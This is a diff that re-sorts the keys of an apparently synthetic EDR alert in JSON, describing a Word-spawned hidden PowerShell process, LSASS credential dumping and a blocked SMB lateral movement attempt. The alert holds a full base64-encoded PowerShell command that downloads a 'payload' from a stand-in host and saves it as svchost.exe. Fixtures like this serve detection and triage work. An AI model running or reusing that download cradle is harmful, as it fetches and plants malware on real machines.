@@ -1,68 +1,68 @@
 {
   "alert_id": "alert-20260502-001",
   "alert_type": "edr_alert",
-  "host": "HOST-12",
-  "host_fqdn": "HOST-12.corp.example",
-  "timestamp": "2026-05-02T09:14:00Z",
-  "severity": "high",
-  "description": "Suspicious child process spawned by Office application",
-  "source_process": "winword.exe",
   "child_process": "powershell.exe",
-  "process_events": [
-    {
-      "event_id": "pe-001",
-      "event_type": "process_event",
-      "process_name": "powershell.exe",
-      "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAJwApAA==",
-      "pid": 7832,
-      "parent_pid": 3104,
-      "parent_process": "winword.exe",
-      "timestamp": "2026-05-02T09:14:03Z",
-      "user": "CORP\\jsmith"
-    }
-  ],
-  "network_events": [
-    {
-      "event_id": "ne-001",
-      "event_type": "network_event",
-      "source_host": "HOST-12",
-      "destination_ip": "192.168.1.100",
-      "destination_port": 443,
-      "protocol": "HTTPS",
-      "bytes_sent": 1842,
-      "bytes_received": 98304,
-      "timestamp": "2026-05-02T09:14:07Z",
-      "process": "powershell.exe",
-      "pid": 7832,
-      "classification": "external_c2_candidate"
-    }
-  ],
   "credential_access_events": [
     {
       "event_id": "ca-001",
       "event_type": "credential_access",
+      "host": "HOST-12",
+      "pid": 7832,
+      "process": "powershell.exe",
+      "target_process": "lsass.exe",
       "technique": "T1003.001",
       "technique_name": "OS Credential Dumping: LSASS Memory",
-      "process": "powershell.exe",
-      "pid": 7832,
-      "target_process": "lsass.exe",
-      "timestamp": "2026-05-02T09:14:11Z",
-      "host": "HOST-12"
+      "timestamp": "2026-05-02T09:14:11Z"
     }
   ],
+  "description": "Suspicious child process spawned by Office application",
+  "host": "HOST-12",
+  "host_fqdn": "HOST-12.corp.example",
   "lateral_movement_events": [
     {
-      "event_id": "lm-001",
-      "event_type": "lateral_movement_attempt",
-      "technique": "T1021.002",
-      "technique_name": "Remote Services: SMB/Windows Admin Shares",
-      "source_host": "HOST-12",
       "destination_host": "HOST-13",
       "destination_ip": "10.0.1.13",
-      "timestamp": "2026-05-02T09:14:19Z",
-      "process": "powershell.exe",
+      "event_id": "lm-001",
+      "event_type": "lateral_movement_attempt",
       "pid": 7832,
-      "status": "blocked_by_firewall"
+      "process": "powershell.exe",
+      "source_host": "HOST-12",
+      "status": "blocked_by_firewall",
+      "technique": "T1021.002",
+      "technique_name": "Remote Services: SMB/Windows Admin Shares",
+      "timestamp": "2026-05-02T09:14:19Z"
     }
-  ]
+  ],
+  "network_events": [
+    {
+      "bytes_received": 98304,
+      "bytes_sent": 1842,
+      "classification": "external_c2_candidate",
+      "destination_ip": "192.168.1.100",
+      "destination_port": 443,
+      "event_id": "ne-001",
+      "event_type": "network_event",
+      "pid": 7832,
+      "process": "powershell.exe",
+      "protocol": "HTTPS",
+      "source_host": "HOST-12",
+      "timestamp": "2026-05-02T09:14:07Z"
+    }
+  ],
+  "process_events": [
+    {
+      "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAJwApAA==",
+      "event_id": "pe-001",
+      "event_type": "process_event",
+      "parent_pid": 3104,
+      "parent_process": "winword.exe",
+      "pid": 7832,
+      "process_name": "powershell.exe",
+      "timestamp": "2026-05-02T09:14:03Z",
+      "user": "CORP\\jsmith"
+    }
+  ],
+  "severity": "high",
+  "source_process": "winword.exe",
+  "timestamp": "2026-05-02T09:14:00Z"
 }
